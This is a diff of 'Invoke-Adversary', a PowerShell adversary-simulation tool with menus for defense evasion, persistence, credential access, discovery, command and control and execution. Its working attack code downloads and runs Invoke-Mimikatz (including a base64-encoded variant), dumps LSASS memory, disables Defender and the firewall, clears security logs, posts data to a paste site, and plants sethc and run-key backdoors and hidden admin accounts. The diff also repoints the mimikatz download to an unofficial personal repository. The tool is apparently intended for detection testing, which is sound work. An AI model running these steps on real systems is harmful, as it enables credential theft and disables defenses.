@@ -1,13 +1,13 @@
-<#
-This sample script is not supported under any standard support program or service.
-This sample sample script is provided AS IS without warranty of any kind.
-The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability
-or of fitness for a particular purpose.
-The entire risk arising out of the use or performance of the sample scripts and documentation remains with you.
-In no event shall the author, or anyone else involved in the creation, production, or delivery
-of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits,
-business interruption, loss of business information, or other pecuniary loss) arising out of the use
-of or inability to use the sample scripts or documentation, even if the author has been
+﻿<#
+This sample script is not supported under any standard support program or service. 
+This sample sample script is provided AS IS without warranty of any kind. 
+The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability 
+or of fitness for a particular purpose. 
+The entire risk arising out of the use or performance of the sample scripts and documentation remains with you. 
+In no event shall the author, or anyone else involved in the creation, production, or delivery 
+of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits, 
+business interruption, loss of business information, or other pecuniary loss) arising out of the use 
+of or inability to use the sample scripts or documentation, even if the author has been 
 advised of the possibility of such damages.
 #>
 <#
@@ -16,7 +16,7 @@ advised of the possibility of such damages.
 .DESCRIPTION
    Create interactive menu
 .NOTES
-	Author      :: Moti Bani - Moti.ba@hotmail.com
+	Author      :: Moti Bani - Moti.ba@hotmail.com 
 	Version 1.0 :: 11-March-2017 :: [Release] :: Publicly available
 #>
 Function Write-Menu {
@@ -40,7 +40,7 @@ Function Write-Menu {
     Begin {
     }
     Process {
-        if ($Header -ne '') {
+        if ($Header -ne '') { 
             Write-Host "`n$Header" -ForegroundColor $HeaderColor
             $underLine = "-" * $Header.length
             Write-Host $underLine
@@ -59,19 +59,19 @@ Function Write-Menu {
             }
             else {
                 if ([int]$selection -le $Items.Length) {
-                    Return $Items[[int]$selection - 1]
+                    Return $Items[[int]$selection - 1]    
                 }
-
+            
             }
         } while ($true)
     }
-
+    
     End {
     }
 }
 Function Write-LogToConsole([string]$msg) {
     $strDate = Get-Date -Format "hh:mm:ss"
-    Write-Host "[*] [$strDate]`t$msg"  -ForegroundColor Yellow
+    Write-Host "[*] [$strDate]`t$msg"  -ForegroundColor Yellow       
 }
 Function Write-CmdToConsole([string]$msg) {
     $strDate = Get-Date -Format "hh:mm:ss"
@@ -82,26 +82,26 @@ Function Write-ErrToConsole([string]$msg) {
     Write-Host "[!] [$strDate]`t$msg"  -ForegroundColor Red
 }
 Function DisplayEULA(){
-
+    
     $Eula = "
-This sample script is not supported under any standard support program or service.
-This sample sample script is provided AS IS without warranty of any kind.
-The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability or of fitness for a particular purpose.
-The entire risk arising out of the use or performance of the sample scripts and documentation remains with you.
-In no event shall the author, or anyone else involved in the creation, production, or delivery
-of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits,
-business interruption, loss of business information, or other pecuniary loss) arising out of the use
-of or inability to use the sample scripts or documentation, even if the author has been
+This sample script is not supported under any standard support program or service. 
+This sample sample script is provided AS IS without warranty of any kind. 
+The author further disclaims all implied warranties including, without limitation, any implied warranties of merchantability or of fitness for a particular purpose. 
+The entire risk arising out of the use or performance of the sample scripts and documentation remains with you. 
+In no event shall the author, or anyone else involved in the creation, production, or delivery 
+of the script be liable for any damages whatsoever (including, without limitation, damages for loss of business profits, 
+business interruption, loss of business information, or other pecuniary loss) arising out of the use 
+of or inability to use the sample scripts or documentation, even if the author has been 
 advised of the possibility of such damages.
 "
-
+    
     Write-Host $Eula -ForegroundColor Green -BackgroundColor Black
     Write-Host "Please read the legal discalimer carefully and approve that you are acceppting the terms
-By using this script Windows system's security and stability (passwords dump,disabling security features, etc.) may be affected so DON'T RUN IT ON PRODUCTION systems
+By using this script Windows system's security and stability (passwords dump,disabling security features, etc.) may be affected so DON'T RUN IT ON PRODUCTION systems 
 By writing 'Yes' you acknowledge that you are aware of this and take sole responsibility for any personally identifiable or other sensitive information through your use of the script"  -ForegroundColor Red -BackgroundColor Black
 
-
-    while ($Anwser -ne "Yes"){ $Anwser = Read-Host -Prompt "`nPlease Write Yes to accept the terms" }
+    
+    while ($Anwser -ne "Yes"){ $Anwser = Read-Host -Prompt "`nPlease Write Yes to accept the terms" }        
 }
 
 Function Init() {
@@ -114,7 +114,7 @@ Function Init() {
                 [Security.Principal.WindowsBuiltInRole] "Administrator")) {
         Write-Warning "You need to be Administrator to run all test cases"
     }
-
+    
     Write-Host "`tTool    :: Invoke-Adversary" -ForegroundColor Magenta
     Write-Host "`tAuthor  :: Moti Bani" -ForegroundColor Magenta
     Write-Host "`tTwitter :: @Moti_Ba" -ForegroundColor Magenta
@@ -127,13 +127,13 @@ Function Init() {
     Write-Host "`tWindows Version :: $([environment]::OSVersion.Version)" -ForegroundColor Magenta
     Write-Host "`tArchitecture    ::  $((gwmi win32_operatingsystem).OSArchitecture)" -ForegroundColor Magenta
     Write-Host ""
-
-    DisplayEULA
+    
+    DisplayEULA  
 }
-Function Main () {
-
+Function Main () {   
+    
     $Tactics = @("Defense Evasion", "Persistence", "Credential Access", "Discovery", "Command and Control", "Execution", "Collection", "AppLocker ByPasses")
-
+    
     switch (Write-Menu -Header "Main - Adversary Tactics" -HeaderColor Green -Items $Tactics) {
         "Persistence" {  Main_Persistence}
         "Discovery" { Main_Discovery}
@@ -149,7 +149,7 @@ Function Main () {
 Function Main_ApplockerBypass() {
     $subTactics = @("Regsvr32","Back to Main")
     switch (Write-Menu -Header "AppLocker ByPass" -HeaderColor Green -Items $subTactics) {
-        "Regsvr32" {sub_ApplockerBypass_Regsvr32}
+        "Regsvr32" {sub_ApplockerBypass_Regsvr32} 
         "Back to Main"{Main}
     }
     Main_ApplockerBypass
@@ -162,57 +162,57 @@ Function sub_ApplockerBypass_Regsvr32() {
 Function Main_C2() {
     $subTactics = @("Commonly Used Ports", "Uncommonly Used Ports", "Web Service", "DNS - Well-Known Blacklisted IP Address", "Connect - Well-Known Blacklisted IP Address","Back to Main")
     switch (Write-Menu -Header "Command and Control" -HeaderColor Green -Items $subTactics) {
-        "Commonly Used Ports" {sub_CommandAndControl_CommonPorts}
-        "Uncommonly Used Ports" {sub_CommandAndControl_UncommonPorts}
+        "Commonly Used Ports" {sub_CommandAndControl_CommonPorts} 
+        "Uncommonly Used Ports" {sub_CommandAndControl_UncommonPorts} 
         "Web Service" {sub_CommandAndControl_WebServicePasteBin}
         "Connect - Well-Known Blacklisted IP Address" {sub_CommandAndControl_BlacklistedIPAddresses}
-        "DNS - Well-Known Blacklisted IP Address" {sub_CommandAndControl_BlacklistedIPAddressesDNS}
+        "DNS - Well-Known Blacklisted IP Address" {sub_CommandAndControl_BlacklistedIPAddressesDNS}        
         "Back to Main"{Main}
     }
     Main_C2
 }
 Function sub_CommandAndControl_BlacklistedIPAddressesDNS() {
     $url = "https://www.ip-finder.me/ip-full-list/"
-    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"
-    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"}
+    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"    
+    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"} 
     $Links = $WebRequest.Links | Select-Object -ExpandProperty innerText -First 10 -Skip 5
 
-
+    
 
     foreach ($link in $Links) {
-        Write-LogToConsole "Resolving Blacklisted IP address: [$($link)]"
+        Write-LogToConsole "Resolving Blacklisted IP address: [$($link)]"  
         Start-ProcessEx -FileName "nslookup.exe" -Arguments "$link"
         Write-LogToConsole "$link"
-    }
+    }        
 }
-Function sub_CommandAndControl_BlacklistedIPAddresses() {
+Function sub_CommandAndControl_BlacklistedIPAddresses() {    
     $url = "https://www.ip-finder.me/ip-full-list/"
-    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"
-    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"}
+    Write-LogToConsole "Fetching 10 Blacklisted IP address from [$($url)]"    
+    $WebRequest = Invoke-WebRequest -Uri $url -Headers @{ "dnt" = "1"; "accept-encoding" = "gzip, deflate, br"; "accept-language" = "en-US,en;q=0.9"; "upgrade-insecure-requests" = "1"; "user-agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"; "accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; "referer" = "https://www.ip-finder.me/178.137.87.242/"; "scheme" = "https"; "method" = "GET"} 
     $Links = $WebRequest.Links | Select-Object -ExpandProperty innerText -First 10 -Skip 5
 
     $ErrorActionPreference = 'SilentlyContinue'
 
     foreach ($link in $Links) {
-        Write-LogToConsole "Connecting to Blacklisted IP address: [$($link)]"
+        Write-LogToConsole "Connecting to Blacklisted IP address: [$($link)]"  
         Invoke-WebRequest -Uri "http://$link" -Method Get -TimeoutSec 3
         Write-LogToConsole "$link"
     }
 
     $ErrorActionPreference = 'Continue'
-
+        
 }
 Function sub_CommandAndControl_WebServicePasteBin() {
     $Content = (get-wmiobject win32_service -filter "name='BITS'") | out-string
 
     #Create Paste string from input
     $string = [System.Web.HttpUtility]::UrlEncode($($Content | Format-Table -AutoSize | Out-String))
-    $PSContent = @()
+    $PSContent = @() 
     $PSContent += "code=$($string)"
-
+    
     Invoke-WebRequest -Uri 'http://pastebin.xyz/api/v1/paste.php' -Method Post -Body "code=$($Content)" -OutVariable response | Out-Null
-
-    Write-LogToConsole "$Content copied to Pastbin URL: $($response.Content)"
+	
+    Write-LogToConsole "$Content copied to Pastbin URL: $($response.Content)"    
 }
 Function sub_CommandAndControl_UncommonPorts() {
     $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
@@ -224,18 +224,18 @@ Function sub_CommandAndControl_UncommonPorts() {
         $Ports = @(1913, 81, 8081, 8088, 995, 13000)
         $ErrorActionPreference = 'SilentlyContinue'
         foreach ($Port in $Ports) {
-            Write-LogToConsole "Probing port: $Port"
+            Write-LogToConsole "Probing port: $Port"                
             $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $Port)
             if ($Socket.Connected) {
-                Write-LogToConsole "Port: [($Port)] is Open"
+                Write-LogToConsole "Port: [($Port)] is Open"                
                 $Socket.Close()
             }
             else
             {
-                Write-LogToConsole "Port: [($Port)] is Closed"
+                Write-LogToConsole "Port: [($Port)] is Closed" 
             }
         }
-        $ErrorActionPreference = 'Continue'
+        $ErrorActionPreference = 'Continue'        
     }
 }
 Function sub_CommandAndControl_CommonPorts() {
@@ -248,18 +248,18 @@ Function sub_CommandAndControl_CommonPorts() {
         $Ports = @(80, 443, 25, 8080, 1433)
         $ErrorActionPreference = 'SilentlyContinue'
         foreach ($Port in $Ports) {
-            Write-LogToConsole "Probing port: $Port"
+            Write-LogToConsole "Probing port: $Port"                
             $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $Port)
             if ($Socket.Connected) {
-                Write-LogToConsole "Port: [($Port)] is Open"
+                Write-LogToConsole "Port: [($Port)] is Open"                
                 $Socket.Close()
             }
             else
             {
-                Write-LogToConsole "Port: [($Port)] is Closed"
+                Write-LogToConsole "Port: [($Port)] is Closed" 
             }
         }
-        $ErrorActionPreference = 'Continue'
+        $ErrorActionPreference = 'Continue'        
     }
 }
 #endregion
@@ -268,7 +268,7 @@ Function Main_Collection() {
     $subTactics = @("Screen Capture","Back to Main")
     switch (Write-Menu -Header "Collection" -HeaderColor Green -Items $subTactics) {
         "Screen Capture" {sub_Collection_ScreenCapture}
-        "Back to Main"{Main}
+        "Back to Main"{Main} 
     }
     Main_Collection
 }
@@ -288,9 +288,9 @@ Function sub_Collection_ScreenCapture() {
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($FileName)
-
+    
     Invoke-Item $FileName
-
+    
 
 }
 #endregion
@@ -298,13 +298,13 @@ Function sub_Collection_ScreenCapture() {
 Function Main_DefenseEvasion() {
     $subTactics = @("Disable network interface", "Disable Windows Defender AV", "Add local firewall rule exceptions", "Turn off Windows Firewall", "Clear Security Log","Back to Main")
     switch (Write-Menu -Header "Defense Evasion" -HeaderColor Green -Items $subTactics) {
-        "Disable network interface" {sub_DefenseEvasion_DisableNIC}
-        "Add local firewall rule exceptions" {sub_DefenseEvasion_AddFirewallRule}
-        "Disable Windows Defender AV" {sub_DefenseEvasion_DisableWindowsDefenderAV}
+        "Disable network interface" {sub_DefenseEvasion_DisableNIC}   
+        "Add local firewall rule exceptions" {sub_DefenseEvasion_AddFirewallRule}   
+        "Disable Windows Defender AV" {sub_DefenseEvasion_DisableWindowsDefenderAV}  
         "Turn off Windows Firewall" {sub_DefenseEvasion_DisableWindowsFirewall}
         "Clear Security Log" {sub_DefenseEvasion_ClearSecurityLog}
         "Back to Main"{Main}
-
+        
     }
     Main_DefenseEvasion
 }
@@ -331,16 +331,15 @@ Function sub_DefenseEvasion_DisableWindowsDefenderAV() {
 #endregion
 #region Credentials
 Function Main_Credentials() {
-    $subTactics = @("Mimikatz - Logonpasswords", "PowerShell Mimikatz", "PowerShell Mimikatz W10 1809", "PowerShell Encoded Mimikatz", "Capture Lsass Memory Dump", "Capture Lsass Memory Dump (Prodump)", "Copy Local SAM File (via Invoke-NinjaCopy)", "Copy Local ntds File (via Invoke-NinjaCopy)", "Back to Main")
+    $subTactics = @("Mimikatz - Logonpasswords", "PowerShell Mimikatz", "PowerShell Encoded Mimikatz", "Capture Lsass Memory Dump", "Capture Lsass Memory Dump (Prodump)", "Copy Local SAM File (via Invoke-NinjaCopy)", "Copy Local ntds File (via Invoke-NinjaCopy)", "Back to Main")
     switch (Write-Menu -Header "Credential Access Tactics" -HeaderColor Green -Items $subTactics) {
-        "PowerShell Mimikatz" {sub_Credentials_Mimikatz}
-        "PowerShell MimiKatz W10 1809" {sub_Credentials_Mimikatz1809}
-        "PowerShell Encoded Mimikatz" {sub_Credentials_EncodedMimikatz}
-        "Mimikatz - Logonpasswords" {sub_Credentials_MimikatzLogonpasswords}
-        "Capture Lsass Memory Dump" {sub_Credentials_LsassMemoryDump}
-        "Capture Lsass Memory Dump (Prodump)" {sub_Credentials_LsassMemoryProcDump}
-        "Copy Local SAM File (via Invoke-NinjaCopy)" {sub_Credentials_CopySamFile}
-	    "Copy Local ntds File (via Invoke-NinjaCopy)" {sub_Credentials_CopyNtdsFile}
+        "PowerShell Mimikatz" {sub_Credentials_Mimikatz}   
+        "PowerShell Encoded Mimikatz" {sub_Credentials_EncodedMimikatz}  
+        "Mimikatz - Logonpasswords" {sub_Credentials_MimikatzLogonpasswords}   
+        "Capture Lsass Memory Dump" {sub_Credentials_LsassMemoryDump} 
+        "Capture Lsass Memory Dump (Prodump)" {sub_Credentials_LsassMemoryProcDump} 
+        "Copy Local SAM File (via Invoke-NinjaCopy)" {sub_Credentials_CopySamFile} 
+	"Copy Local ntds File (via Invoke-NinjaCopy)" {sub_Credentials_CopyNtdsFile}
         "Back to Main"{Main}
     }
     Main_Credentials
@@ -364,11 +363,11 @@ Function sub_Credentials_LsassMemoryProcDump() {
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
     $DumpFile = [System.IO.Path]::GetTempFileName().replace(".tmp", ".dmp")
     $url = "https://live.sysinternals.com/procdump.exe"
-
+    
     Write-LogToConsole "Downloading procdump into [$FileName]"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $FileName)
-
+    
     Unblock-File $FileName
     Start-ProcessEx -FileName $FileName -Arguments "-accepteula -accepteula -64 -ma lsass.exe $DumpFile"
 
@@ -410,11 +409,6 @@ Function sub_Credentials_LsassMemoryDump() {
 Function sub_Credentials_Mimikatz() {
     Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/InvokeMimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
 }
-
-Function sub_Credentials_Mimikatz1809() {
-    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/Invoke-Mimikatz1809v2.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
-}
-
 Function sub_Credentials_EncodedMimikatz() {
     Start-ProcessEx -FileName "PowerShell.exe" -Arguments "-enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGIAYQBzAHQAaQAxAC0AYgAvAHMAYwByAGkAcAB0AHMALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAAJABtACAAPQAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA7ACAAJABtAA=="
     #Start-ProcessEx -FileName "PowerShell.exe" -Arguments "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=="
@@ -424,12 +418,12 @@ Function sub_Credentials_MimikatzLogonpasswords() {
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".zip")
     $Folder = [System.IO.Path]::GetDirectoryName($FileName)
     #$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip"
-    $url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200227/mimikatz_trunk.zip"
-
+    $url = "https://github.com/basti1-b/scripts/raw/master/mimikatz_trunk.zip"
+    
     Write-LogToConsole "Downloading mimikatz into [$FileName]"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $FileName)
-
+    
     Unblock-File $FileName
     [System.IO.Compression.ZipFile]::ExtractToDirectory($FileName, $Folder)
     if([Environment]::Is64BitOperatingSystem)  {
@@ -445,20 +439,20 @@ Function sub_Credentials_MimikatzLogonpasswords() {
     sleep -Milliseconds 500
     Remove-Item "$Folder\x64\" -Force -Recurse
     Remove-Item "$Folder\Win32\" -Force -Recurse
-    Remove-Item "$Folder\mimicom.idl" -Force
+    Remove-Item "$Folder\mimicom.idl" -Force 
     Remove-Item "$Folder\kiwi_passwords.yar" -Force
     Remove-Item "$Folder\README.md" -Force
 
 
 }
-#endregion
+#endregion 
 #region Discovery
-Function Main_Discovery() {
+Function Main_Discovery() {   
     $subTactics = @("Account Discovery", "Network Service Scanning", "System Owner Discovery", "System Time Discovery", "Service Discovery", "Network Connections Discovery", "Network Session Enumeration","Back to Main")
     switch (Write-Menu -Header "Discovery Tactics" -HeaderColor Green -Items $subTactics) {
-        "Account Discovery" {sub_Discovery_Accounts}
+        "Account Discovery" {sub_Discovery_Accounts}    
         "Network Service Scanning" {sub_Discovery_NetworkServiceScanning}
-        "System Owner Discovery" {sub_Discovery_SystemOwner}
+        "System Owner Discovery" {sub_Discovery_SystemOwner}    
         "System Time Discovery" {sub_Discovery_SystemTime}
         "Service Discovery" {sub_Discovery_SystemServices}
         "Network Connections Discovery" {sub_Discovery_SystemNetworkConnections}
@@ -468,7 +462,7 @@ Function Main_Discovery() {
     Main_Discovery
 }
 Function sub_Discovery_SystemNetworkSessionEnum(){
-
+    
 }
 
 Function sub_Discovery_SystemNetworkConnections() {
@@ -491,17 +485,17 @@ Function sub_Discovery_NetworkServiceScanning() {
     if (-not(Test-Connection -ComputerName $HostName -Count 2 -Quiet)) {
         Write-Warning "$HostName is not available"
     }
-    else
+    else 
     {
         Write-LogToConsole "About to scan ports 1-1024 on $HostName (It may take times)"
-        for ($i = 1; $i -lt 1024; $i++)
-        {
+        for ($i = 1; $i -lt 1024; $i++) 
+        { 
             $Socket = New-Object System.Net.Sockets.TcpClient($HostName, $i)
-            if ($Socket.Connected)
+            if ($Socket.Connected) 
             {
-                Write-LogToConsole "Port [$i] is Open"
+                Write-LogToConsole "Port [$i] is Open"                
                 $Socket.Close()
-            } else
+            } else 
             {
                 Write-LogToConsole "Port [$i] is Closed"
             }
@@ -527,7 +521,7 @@ Function sub_Discovery_Accounts() {
 }
 #endregion
 #region Persistence
-Function Main_Persistence() {
+Function Main_Persistence() {   
     $subTactics = @("Accessibility Features", "AppInit DLLs", "Application Shimming", "Create local user", "Create local Administrator", `
             "Create New Service", "Create New Service (Unquoted Path)", "Registry Run Keys [HKLM]", "Registry Run Keys [HKCU]", "Scheduled tasks","Back to Main")
     switch (Write-Menu -Header "Persistence Tactics" -HeaderColor Green -Items $subTactics) {
@@ -547,7 +541,7 @@ Function Main_Persistence() {
 }
 Function sub_Persistence_NewService([switch]$Unquoted) {
     if ($Unquoted) {
-        New-Service -Name "WindowsHealth" -BinaryPathName "C:\program files\myapp.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose
+        New-Service -Name "WindowsHealth" -BinaryPathName "C:\program files\myapp.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose    
     }
     else {
         New-Service -Name "WindowsHealth" -BinaryPathName "c:\Windows\Notepad.exe" -DisplayName "Windows Health" -Description "Windows Health Monitor" -StartupType Automatic -Verbose
@@ -559,11 +553,11 @@ Function sub_Persistence_ScheduledTasks() {
 }
 Function sub_Persistence_RegistryRunKeysHKLM() {
     Set-RegistryKey -RegKey "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" `
-        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String
+        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String        
 }
 Function sub_Persistence_RegistryRunKeysHKCU() {
     Set-RegistryKey -RegKey "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String
+        -RegValue  'svchost'  -RegData '%APPDATA%\Microsoft\Network\svchost.exe' -RegType String    
 }
 Function sub_Persistence_CreateLocalUser() {
     $Username = "support_388945a0" # APT3
@@ -578,11 +572,11 @@ Function sub_Persistence_CreateLocalUser() {
     else {
         Write-LogToConsole "User $Username already exist, try to activate"
         Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username /active:yes"
-
+      
         Write-LogToConsole "Setting password for existing local user $Username"
-        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username $Password"
+        Start-ProcessEx -FileName "net.exe" -Arguments "USER $Username $Password"  
     }
-}
+} 
 Function sub_Persistence_CreateLocalAdministrator() {
     $Username = "Lost_337fde69_81a9" # S-TYPE
     $Password = "pond~!@6_337fde69-81a9-442e-99d4-7cd29ecd06ad"
@@ -601,16 +595,16 @@ Function sub_Persistence_CreateLocalAdministrator() {
 }
 Function sub_Persistence_AccessibilityFeatures() {
     Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" `
-        -RegValue  'Debugger'  -RegData 'C:\Windows\System32\cmd.exe' -RegType String
-}
+        -RegValue  'Debugger'  -RegData 'C:\Windows\System32\cmd.exe' -RegType String    
+} 
 Function sub_Persistence_AppInit() {
     Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" `
-        -RegValue  'AppInit_DLLs'  -RegData 'pserver32.dll' -RegType String
-}
+        -RegValue  'AppInit_DLLs'  -RegData 'pserver32.dll' -RegType String    
+} 
 Function sub_Persistence_ApplicationShimming() {
     Set-RegistryKey -RegKey "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{842562ef-8d28-411d-a67d-ab75ef611fe8}.sdb" `
-        -RegValue  'UninstallString'  -RegData 'C:\WINDOWS\system32\sdbinst.exe -u "C:\WINDOWS\AppPatch\Custom\{842562ef-8d28-411d-a67d-ab75ef611fe8}.sdb"' -RegType String
-}
+        -RegValue  'UninstallString'  -RegData 'C:\WINDOWS\system32\sdbinst.exe -u "C:\WINDOWS\AppPatch\Custom\{842562ef-8d28-411d-a67d-ab75ef611fe8}.sdb"' -RegType String    
+} 
 #endregion
 #region Execution
 Function Main_Execution() {
@@ -620,7 +614,7 @@ Function Main_Execution() {
         "PSExec (Remote)" {sub_Execution_PSExecRemote}
         "PowerShell API call" {sub_Execution_PSAPICall}
         "Self Delete (batch file)" {sub_Execution_SDelete}
-        "WMI Process Execution"{sub_Execution_WmiProcess}
+        "WMI Process Execution"{sub_Execution_WmiProcess}        
         "Back to Main"{Main}
     }
     Main_Execution
@@ -641,27 +635,27 @@ Function sub_Execution_PSAPICall() {
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-
+ 
 public static class User32Dll
 {
     [DllImport("user32.dll", CharSet=CharSet.Auto)]
         public static extern bool MessageBox(
-            IntPtr hWnd,     /// Parent window handle
+            IntPtr hWnd,     /// Parent window handle 
             String text,     /// Text message to display
             String caption,  /// Window caption
             int options);    /// MessageBox type
 }
-"@
+"@   
     [User32Dll]::MessageBox(0, "API Call Succeed", "Invoke-Adversary", 0) |Out-Null
 }
 Function sub_Execution_PSExecRemote() {
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
     $url = "https://live.sysinternals.com/psexec.exe"
-
+    
     Write-LogToConsole "Downloading PSExec into [$FileName]"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $FileName)
-
+    
     Unblock-File $FileName
     $HostName = Read-Host -Prompt "Hostname or IP address of server to connect"
     Start-ProcessEx -FileName $FileName -Arguments "\\$HostName -accepteula -s cmd.exe /c whoami"
@@ -672,24 +666,24 @@ Function sub_Execution_PSExecRemote() {
 Function sub_Execution_PSExecRandom() {
     $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
     $url = "https://live.sysinternals.com/psexec.exe"
-
+    
     Write-LogToConsole "Downloading PSExec into [$FileName]"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $FileName)
-
+    
     Unblock-File $FileName
     Start-ProcessEx -FileName $FileName -Arguments "-accepteula -s cmd.exe /c whoami"
 
     Write-LogToConsole "Deleting PSExec [$FileName]"
     Remove-Item $FileName -Force
 }
-#endregion
+#endregion 
 Function Start-ProcessEx {
     Param
     (
         [string]$FileName,
         [string]$Arguments
-    )
+    )    
 
     $props = @{
         'Stdout'   = $null;
@@ -708,26 +702,26 @@ Function Start-ProcessEx {
     $p = New-Object System.Diagnostics.Process
     $p.StartInfo = $pinfo
 
-    Write-LogToConsole "Executing: $FileName $Arguments"
+    Write-LogToConsole "Executing: $FileName $Arguments"  
 
     $p.Start() | Out-Null
     $props.Stdout = $p.StandardOutput.ReadToEnd()
     $props.Stderr = $p.StandardError.ReadToEnd()
 
     $p.WaitForExit()
-
+ 
 
     $props.ExitCode = $p.ExitCode
-
-    Write-LogToConsole "Process ID: [$($p.Id)] Exit Code: [$($props.ExitCode)]"
-
+    
+    Write-LogToConsole "Process ID: [$($p.Id)] Exit Code: [$($props.ExitCode)]"  
+    
     if ($props.ExitCode -ne 0) {
-        Write-ErrToConsole  $props.Stderr
+        Write-ErrToConsole  $props.Stderr   
     }
     else {
         Write-CmdToConsole $props.Stdout
     }
-
+    
